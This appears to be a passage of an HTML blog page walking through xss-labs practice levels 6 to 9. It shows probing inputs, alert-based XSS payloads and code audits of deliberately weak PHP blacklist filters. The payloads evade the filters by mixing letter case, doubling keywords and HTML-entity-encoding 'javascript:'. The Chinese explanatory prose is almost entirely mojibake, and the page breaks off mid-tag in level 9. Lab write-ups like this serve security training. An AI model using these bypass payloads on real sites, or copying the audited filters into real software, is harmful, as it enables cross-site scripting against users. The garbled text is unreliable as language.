title="å…­ã€level-06ï¼ˆå¤§å†™ç»•è¿‡ï¼‰"></a>å…­ã€level-06ï¼ˆå¤§å†™ç»•è¿‡ï¼‰</h1><h2 id="6-1-é¢˜é¢"><a href="#6-1-é¢˜é¢" class="headerlink" title="6.1 é¢˜é¢"></a>6.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.57.07.png" style="zoom:40%;"><h2 id="6-2-è§£é¢˜"><a href="#6-2-è§£é¢˜" class="headerlink" title="6.2 è§£é¢˜"></a>6.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤å’Œå›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2016.59.26.png" style="zoom:50%;"><p>å’Œä¹‹å‰ä¸€æ ·ï¼Œä»ç„¶æ˜¯ä»inputè·å–è¾“å…¥çš„keywordï¼Œç„¶ågetè¯·æ±‚å‘é€åˆ°åç«¯ï¼Œç„¶åå›æ˜¾åˆ°é¡µé¢ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹åç«¯è¿‡æ»¤å™¨</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.04.18.png" style="zoom:60%;"><p>å¯ä»¥çœ‹åˆ°<code>&lt;script</code>ä¸­é—´å’Œonä¸­é—´æ·»åŠ äº†ä¸‹åˆ’çº¿ï¼›å•åŒå¼•å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼›Oæ²¡æœ‰è¢«è½¬åŒ–ä¸ºå°å†™ï¼›scriptæ²¡æœ‰è¢«æ›¿æ¢ï¼›</p><ul><li>æ„é€ payload</li></ul><p>1ï¼‰ åŸºäºä¸Šä¸€å…³çš„ç»éªŒæ„é€ ä¸‹é¢çš„payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"&gt; &lt;a href="</span><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token string">"&gt;ç‚¹æˆ‘&lt;/a&gt; &lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.07.28.png" style="zoom:50%;"><p>hrefå±æ€§è¢«åŠ äº†ä¸‹åˆ’çº¿ã€‚ç”±äºæ²¡æœ‰å°†å¤§å†™è½¬åŒ–ä¸ºå°å†™ï¼Œå¯ä»¥åŸºäºjså’Œhtmlçš„å¤§å°å†™æ•æ„Ÿæ€§ä¸åŒæ¥ç»•è¿‡è¿‡æ»¤å™¨ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string double-quoted-string">"&gt; &lt;a hRef="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>xss<span class="token operator">/</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"&gt;ç‚¹æˆ‘&lt;/a&gt; &lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.15.28.png" style="zoom:50%;"><p>2ï¼‰ç”±äºOæ²¡æœ‰è¢«è½¬åŒ–ä¸ºå°å†™ï¼Œå°è¯•å¤§å°å†™ç»•è¿‡</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">" Onmouseover="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.10.03.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.11.03.png" style="zoom:50%;"><h2 id="6-3-ä»£ç å®¡è®¡"><a href="#6-3-ä»£ç å®¡è®¡" class="headerlink" title="6.3 ä»£ç å®¡è®¡"></a>6.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str6</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>inputæ ‡ç­¾ä¸­ä½¿ç”¨è‡ªå®šçš„è¿‡æ»¤å™¨ï¼Œæ²¡æœ‰å°†å†…å®¹è½¬åŒ–ä¸ºå°å†™ï¼Œç„¶åå°†<code>&lt;script</code>æ›¿æ¢æˆ<code>&lt;scr_ipt</code>ï¼Œå°†<code>on</code>æ›¿æ¢æˆ<code>o_n</code>ï¼Œå°†<code>src</code>æ›¿æ¢ä¸º<code>sr_c</code>,å°†<code>data</code>æ›¿æ¢ä¸º<code>da_ta</code>,å°†<code>href</code>æ›¿æ¢ä¸º<code>hr_ef</code>ã€‚</p><p>ç”±äºæ²¡æœ‰å°†å¤§å†™è½¬åŒ–ä¸ºå°å†™ï¼Œå¯ä»¥ç”¨å¤§å†™çš„å†…å®¹è½»æ¾ç»•è¿‡ã€‚</p><h2 id="å°ç»“-5"><a href="#å°ç»“-5" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ä½¿ç”¨è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ç§é»‘åå•çš„æ–¹æ¡ˆï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åšå¤§å°å†™è½¬æ¢ï¼Œé€šè¿‡å¯¹payloadè¿›è¡Œå¤§å°å†™çš„è½¬æ¢å¯ä»¥è½»æ¾ç»•è¿‡é»‘åå•ã€‚</p><p>åŸºäºjså’Œhtmlçš„å¤§å°å†™æ•æ„Ÿæ€§ä¸åŒæ¥ç»•è¿‡è¿‡æ»¤å™¨ã€‚</p><h1 id="ä¸ƒã€level-07ï¼ˆåŒå†™ç»•è¿‡ï¼‰"><a href="#ä¸ƒã€level-07ï¼ˆåŒå†™ç»•è¿‡ï¼‰" class="headerlink" title="ä¸ƒã€level-07ï¼ˆåŒå†™ç»•è¿‡ï¼‰"></a>ä¸ƒã€level-07ï¼ˆåŒå†™ç»•è¿‡ï¼‰</h1><h2 id="7-1-é¢˜é¢"><a href="#7-1-é¢˜é¢" class="headerlink" title="7.1 é¢˜é¢"></a>7.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.20.56.png" style="zoom:40%;"><h2 id="7-2-è§£é¢˜"><a href="#7-2-è§£é¢˜" class="headerlink" title="7.2 è§£é¢˜"></a>7.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤å’Œå›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.21.23.png" style="zoom:50%;"><p>å’Œä¹‹å‰ä¸€æ ·ï¼Œä»ç„¶æ˜¯ä»inputè·å–è¾“å…¥çš„keywordï¼Œç„¶ågetè¯·æ±‚å‘é€åˆ°åç«¯ï¼Œç„¶åå›æ˜¾åˆ°é¡µé¢ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹åç«¯è¿‡æ»¤å™¨</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT" ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.24.51.png" style="zoom:50%;"><p>1ï¼‰å¤§å†™è½¬ä¸ºå°å†™</p><p>2ï¼‰å°†scriptæ›¿æ¢ä¸ºç©ºï¼Œå°†onæ›¿æ¢ä¸ºç©º</p><p>3ï¼‰å•åŒå¼•å·æ²¡æœ‰è¿‡æ»¤</p><p>4ï¼‰<code>&lt;&gt;</code>æ²¡æœ‰è¿‡æ»¤</p><ul><li>æ„é€ payload</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"&gt; &lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt; &lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.28.38.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">" oonnmouseover="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2017.29.45.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><h2 id="7-3-ä»£ç å®¡è®¡"><a href="#7-3-ä»£ç å®¡è®¡" class="headerlink" title="7.3 ä»£ç å®¡è®¡"></a>7.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str6</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†é»‘åå•å­—ç¬¦ä¸²æ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯æ²¡æœ‰è€ƒè™‘é€’å½’ï¼Œå‰©ä¸‹çš„å­—ç¬¦ä¸²ç»„åˆèµ·æ¥èƒ½å¤Ÿæ„æˆâ€œscriptâ€ï¼Œâ€œonâ€ï¼Œâ€œsrcâ€ç­‰éæ³•å­—ç¬¦ä¸²ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ã€‚</p><h2 id="å°ç»“-6"><a href="#å°ç»“-6" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åŒå†™ç»•è¿‡ã€‚</p><h1 id="å…«ã€level-08ï¼ˆjavascript-ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼‰"><a href="#å…«ã€level-08ï¼ˆjavascript-ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼‰" class="headerlink" title="å…«ã€level-08ï¼ˆjavascript ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼‰"></a>å…«ã€level-08ï¼ˆjavascript ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼‰</h1><h2 id="8-1-é¢˜é¢"><a href="#8-1-é¢˜é¢" class="headerlink" title="8.1 é¢˜é¢"></a>8.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2018.59.11.png" style="zoom:50%;"><h2 id="8-2-è§£é¢˜"><a href="#8-2-è§£é¢˜" class="headerlink" title="8.2 è§£é¢˜"></a>8.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤å’Œå›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.00.36.png" style="zoom:50%;"><p>ç‚¹å‡»åº—å®¶å‹æƒ…é“¾æ¥ä¼šå°†keywordçš„å€¼é€šè¿‡getè¯·æ±‚å‘é€ã€‚</p><p>å‹æƒ…é“¾æ¥çš„å†…å®¹å¦‚ä¸‹ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.01.33.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.02.25.png" style="zoom:50%;"><p>å†…å®¹ä¼šæ˜¾ç¤ºåœ¨aæ ‡ç­¾çš„hrefå±æ€§ä¸­ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹åç«¯è¿‡æ»¤å™¨</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT" ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.04.09.png" style="zoom:50%;"><p>ç»è¿‡å¤„ç†åçš„payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>scr_ipt scrscr_iptipt<span class="token operator">&amp;</span>quot ' oo_nn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1ï¼‰å¤§å†™è½¬åŒ–ä¸ºäº†å°å†™</p><p>2ï¼‰scriptè½¬ä¸ºscr_iptï¼Œonè½¬ä¸ºo_n</p><p>3ï¼‰åŒå¼•å·ç¼–ç </p><ul><li>æ„é€ payload</li></ul><p>1ï¼‰try1</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"&gt;&lt;a href="</span><span class="token literal-property property">javescript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token string">"&gt;ç‚¹æˆ‘&lt;/a&gt;&lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.10.20.png" style="zoom:67%;"><p>åŒå¼•å·è¢«ç¼–ç ï¼Œhrefä¸­åŠ ä¸‹åˆ’çº¿ï¼Œscriptä¸­åŠ ä¸‹åˆ’çº¿ã€‚</p><p>2ï¼‰try2</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javescript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.13.05.png" style="zoom:67%;"><p>scriptè¢«æ·»åŠ äº†ä¸‹åˆ’çº¿ã€‚</p><p>ç›®å‰ä¸ºæ­¢ï¼šä¸èƒ½ç”¨â€ï¼Œä¸èƒ½ç”¨scriptï¼Œä¸èƒ½ç”¨onï¼Œä¸èƒ½ç”¨hrefã€‚</p><p>3ï¼‰try3</p><p>å°è¯•å°†<code>javascript</code>ç¼–ç ä¸ºhtmlå®ä½“ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token comment">#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.17.54.png" style="zoom:50%;"><p>payload:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2019.19.57.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><h2 id="8-3-ä»£ç å®¡è®¡"><a href="#8-3-ä»£ç å®¡è®¡" class="headerlink" title="8.3 ä»£ç å®¡è®¡"></a>8.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span><span class="token operator">.</span><span class="token variable">$str7</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è½¬å°å†™ï¼Œç„¶åç ´åscriptã€onã€srcã€dataã€hrefã€â€</li></ul><p>å°†javascriptè¿›è¡Œhtmlç¼–ç ä¹‹åï¼Œæµè§ˆå™¨è‡ªåŠ¨è§£æè¿˜åŸæˆjavascriptï¼Œä¼ªåè®®ä»£ç è¢«æˆåŠŸæ‰§è¡Œã€‚</p><h2 id="å°ç»“-7"><a href="#å°ç»“-7" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>htmlå®ä½“ç¼–ç ç»•è¿‡ã€‚</p><h1 id="ä¹ã€level-09-ï¼ˆjavascript-ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼Œalertå­—ç¬¦ä¸²ç»•è¿‡ï¼‰"><a href="#ä¹ã€level-09-ï¼ˆjavascript-ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼Œalertå­—ç¬¦ä¸²ç»•è¿‡ï¼‰" class="headerlink" title="ä¹ã€level-09**ï¼ˆjavascript ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼Œalertå­—ç¬¦ä¸²ç»•è¿‡ï¼‰"></a>ä¹ã€level-09**ï¼ˆjavascript ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼Œalertå­—ç¬¦ä¸²ç»•è¿‡ï¼‰</h1><h2 id="9-1-é¢˜é¢"><a href="#9-1-é¢˜é¢" class="headerlink" title="9.1 é¢˜é¢"></a>9.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.10.06.png" style="zoom:40%;"><h2 id="9-2-è§£é¢˜"><a href="#9-2-è§£é¢˜" class="headerlink" title="9.2 è§£é¢˜"></a>9.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤å’Œå›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.11.06.png" style="zoom:30%;"><p>ä»ç„¶æ˜¯é€šè¿‡GETä¼ é€’keywordè¯·æ±‚å‚æ•°ï¼Œä½†æ˜¯å‹æƒ…é“¾æ¥çš„å†…å®¹é‡Œé¢æ²¡æœ‰å›æ˜¾å€¼ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.14.21.png" style="zoom:50%;"><p>å›æ˜¾å€¼åœ¨keyword inputæ¡†çš„valueå€¼ä¸­ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹åç«¯è¿‡æ»¤å™¨</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script SCRscriptIPT" ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img 